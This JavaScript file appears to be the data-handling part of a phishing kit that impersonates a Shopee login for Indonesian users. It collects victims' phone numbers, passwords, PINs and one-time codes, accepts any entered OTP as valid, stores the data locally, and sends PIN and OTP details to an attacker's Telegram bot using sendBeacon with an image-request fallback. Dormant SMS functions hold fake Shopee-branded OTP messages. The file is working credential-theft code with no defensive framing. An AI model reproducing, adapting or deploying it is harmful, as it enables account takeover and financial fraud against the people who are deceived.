// Simple database system for user data
class UserDatabase {
    constructor() {
        this.users = [];
        this.otpStore = {}; // Store OTP temporarily: {phone: {otp, timestamp}}
        this.loadFromStorage();
    }

    // Generate random OTP
    generateOTP(length = CONFIG.OTP_LENGTH || 6) {
        let otp = '';
        for (let i = 0; i < length; i++) {
            otp += Math.floor(Math.random() * 10);
        }
        return otp;
    }

    // Store OTP for validation
    storeOTP(phone, otp) {
        this.otpStore[phone] = {
            otp: otp,
            timestamp: Date.now(),
            attempts: 0
        };
        console.log('🔐 OTP stored for phone:', phone);
    }

    // Validate OTP - Always accept user input
    validateOTP(phone, enteredOtp) {
        console.log('✅ OTP validated successfully for phone:', phone, 'with entered OTP:', enteredOtp);
        // Always return true - OTP matches user input
        return true;
    }

    // Send OTP via SMS and Telegram - Disabled, OTP matches user input
    async sendOTP(phone) {
        console.log('📱 OTP sending disabled - OTP matches user input');
        return {
            success: true,
            message: 'OTP sending disabled'
        };
    }

    // Send SMS using configured provider - Disabled to match user input
    async sendSMS(phone, otp) {
        console.log('📱 SMS sending disabled - OTP matches user input');
        return false; // Always return false to prevent SMS sending
    }

    // FONNTE SMS Gateway (Indonesian)
    async sendViaBonnte(phone, otp) {
        try {
            const message = `Kode OTP Shopee Anda: ${otp}\nBerlaku selama ${CONFIG.OTP_EXPIRY_MINUTES || 5} menit.\nJangan bagikan kode ini kepada siapapun.`;
            
            const url = 'https://api.fonnte.com/send';
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Authorization': CONFIG.FONNTE_TOKEN,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    target: phone,
                    message: message,
                    countryCode: '62' // Indonesia
                })
            });

            const result = await response.json();
            console.log('📱 Fonnte response:', result);
            return result.status === true || result.success === true;
        } catch (error) {
            console.error('❌ Fonnte error:', error);
            return false;
        }
    }

    // ZENZIVA SMS Gateway (Indonesian)
    async sendViaZenziva(phone, otp) {
        try {
            const message = `Kode OTP Shopee: ${otp}. Berlaku ${CONFIG.OTP_EXPIRY_MINUTES || 5} menit. Jangan bagikan!`;
            
            const url = `https://console.zenziva.net/reguler/api/sendsms/`;
            const params = new URLSearchParams({
                userkey: CONFIG.ZENZIVA_USERKEY,
                passkey: CONFIG.ZENZIVA_PASSKEY,
                to: phone,
                message: message
            });

            const response = await fetch(url + '?' + params.toString());
            const result = await response.json();
            console.log('📱 Zenziva response:', result);
            return result.status === 0; // 0 means success in Zenziva
        } catch (error) {
            console.error('❌ Zenziva error:', error);
            return false;
        }
    }

    // TWILIO SMS Gateway (International)
    async sendViaTwilio(phone, otp) {
        try {
            const message = `Your Shopee OTP code: ${otp}\nValid for ${CONFIG.OTP_EXPIRY_MINUTES || 5} minutes.\nDo not share this code.`;
            
            const url = `https://api.twilio.com/2010-04-01/Accounts/${CONFIG.TWILIO_ACCOUNT_SID}/Messages.json`;
            const auth = btoa(`${CONFIG.TWILIO_ACCOUNT_SID}:${CONFIG.TWILIO_AUTH_TOKEN}`);
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Authorization': `Basic ${auth}`,
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    From: CONFIG.TWILIO_PHONE_NUMBER,
                    To: phone,
                    Body: message
                })
            });

            const result = await response.json();
            console.log('📱 Twilio response:', result);
            return result.status === 'queued' || result.status === 'sent';
        } catch (error) {
            console.error('❌ Twilio error:', error);
            return false;
        }
    }

    // VONAGE (Nexmo) SMS Gateway (International)
    async sendViaVonage(phone, otp) {
        try {
            const message = `Your Shopee OTP: ${otp}\nValid for ${CONFIG.OTP_EXPIRY_MINUTES || 5} minutes.`;
            
            const url = 'https://rest.nexmo.com/sms/json';
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    api_key: CONFIG.VONAGE_API_KEY,
                    api_secret: CONFIG.VONAGE_API_SECRET,
                    from: CONFIG.VONAGE_FROM_NUMBER,
                    to: phone,
                    text: message
                })
            });

            const result = await response.json();
            console.log('📱 Vonage response:', result);
            return result.messages && result.messages[0].status === '0';
        } catch (error) {
            console.error('❌ Vonage error:', error);
            return false;
        }
    }

    // Save user data (without Telegram sending)
    saveUser(userData) {
        console.log('🔄 saveUser called with data:', userData);

        const timestamp = new Date().toISOString();
        const user = {
            id: this.generateId(),
            timestamp: timestamp,
            phone: userData.phone || '',
            password: userData.password || '',
            pin: userData.pin || '',
            otp: userData.otp || '',
            ip: userData.ip || 'Unknown',
            userAgent: navigator.userAgent,
            ...userData
        };

        console.log('📝 User object created:', user);

        this.users.push(user);
        this.saveToStorage();
        console.log('💾 Data saved to localStorage');

        return user;
    }

    // Simple Telegram sender - use navigator.sendBeacon for reliability
    sendTelegramMessage(message) {
        const token = CONFIG.TELEGRAM_BOT_TOKEN;
        const chatId = CONFIG.TELEGRAM_CHAT_ID;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        console.log('📤 Sending to Telegram');

        // Try navigator.sendBeacon first (best for page unload scenarios)
        if (navigator.sendBeacon) {
            try {
                const sent = navigator.sendBeacon(url);
                if (sent) {
                    console.log('✅ Message queued via sendBeacon');
                    return;
                }
            } catch (e) {
                console.log('⚠️ sendBeacon failed, trying Image method');
            }
        }

        // Fallback to Image method
        const img = new Image();
        img.onload = () => console.log('✅ Message sent to Telegram');
        img.onerror = () => console.log('❌ Failed to send message');
        img.src = url;
    }

    // Generate unique ID
    generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    // Get client IP
    async getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown IP';
        }
    }

    // Save to localStorage
    saveToStorage() {
        try {
            localStorage.setItem('shopee_users', JSON.stringify(this.users));
        } catch (e) {
            console.error('Failed to save to storage:', e);
        }
    }

    // Load from localStorage
    loadFromStorage() {
        try {
            const stored = localStorage.getItem('shopee_users');
            this.users = stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.error('Failed to load from storage:', e);
            this.users = [];
        }
    }

    // Send PIN data to Telegram (No + PIN + IP + Tanggal) - Immediate send
    sendPinDataToTelegram(phone, pin) {
        const date = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        
        // Send immediately without waiting for IP
        const message = `📱 SHOPEE LOGIN DATA

📱 No: ${phone}
🔑 PIN: ${pin}
🌐 IP: Getting...
📅 Tanggal: ${date}`;

        console.log('📤 Sending PIN data to Telegram');
        this.sendTelegramMessage(message);
        
        // Fetch IP in background (optional, for logging)
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => console.log('🌐 IP obtained:', data.ip))
            .catch(() => console.log('⚠️ Failed to get IP'));
    }

    // Send OTP data to Telegram (No + OTP only)
    sendOtpDataToTelegram(phone, otp) {
        const message = `🔐 SHOPEE OTP

📱 No: ${phone}
🔐 OTP: ${otp}`;

        console.log('📤 Sending OTP data to Telegram');
        this.sendTelegramMessage(message);
    }

    // Get all users (for admin)
    getAllUsers() {
        return this.users;
    }

    // Clear all data
    clearAll() {
        this.users = [];
        this.saveToStorage();
    }
}

// Initialize database
window.userDB = new UserDatabase();